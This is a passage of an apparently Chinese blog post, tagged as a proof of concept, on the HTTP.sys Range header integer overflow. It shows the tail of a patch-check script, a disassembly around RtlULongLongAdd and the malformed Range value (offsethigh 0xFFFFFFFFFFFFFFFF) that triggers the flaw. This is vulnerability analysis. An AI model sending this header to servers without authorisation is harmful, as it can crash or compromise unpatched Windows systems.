<p>print &quot;[*] Looks Patched&quot;</p>
<p>else:</p>
<p>print &quot;[*] Unexpected response, cannot discern patch status&quot;</p>
<p>print goodResp </p>
</blockquote>
<p><strong>
</strong></p>
<p><strong>漏洞原理：</strong></p>
<p><strong>HTTP.sys 在处理内核缓存数据时，</strong></p>
<p><strong>
</strong></p>
<blockquote>
<p>8a8b2112 56  push esi<br>8a8b2113 6a00  push 0<br>8a8b2115 2bc7  sub eax,edi<br>8a8b2117 6a01  push 1<br>8a8b2119 1bca  sbb ecx,edx<br>8a8b211b 51  push ecx<br>8a8b211c 50  push eax<br>8a8b211d e8bf69fbff call HTTP!RtlULongLongAdd (8a868ae1); here<strong>
</strong> </p>
</blockquote>
<p><strong>
</strong></p>
<p><strong>eax1 = eax - edi</strong></p>
<p><strong>ecx1 = ecx - edx</strong></p>
<p><strong>RtlULongLongAdd (eax1, ecx1)</strong></p>
<p><strong>
</strong></p>
<p>其中 eax1 与 ecx1 是处理 HTTP 请求中</p>
<blockquote>
<p>Range: bytes=&quot;+<strong>offsetlow</strong>+&quot;-&quot;+<strong>offsethigh</strong>+&quot;\r\n\r\n&quot; </p>
</blockquote>
<p><strong>当offsetlow = 0 ,offsethigh= 0xFFFFFFFFFFFFFFFF</strong></p>
<p><strong>时经过 RtlULongLongAdd 操作</strong></p>
<p><strong>0xFFFFFFFFFFFFFFFF+ 0 + 1 = 0 造成整数溢出</strong></p>
<p>&nbsp;</p>
]]></content>
      
        
        <tags>
            
            <tag> POC </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
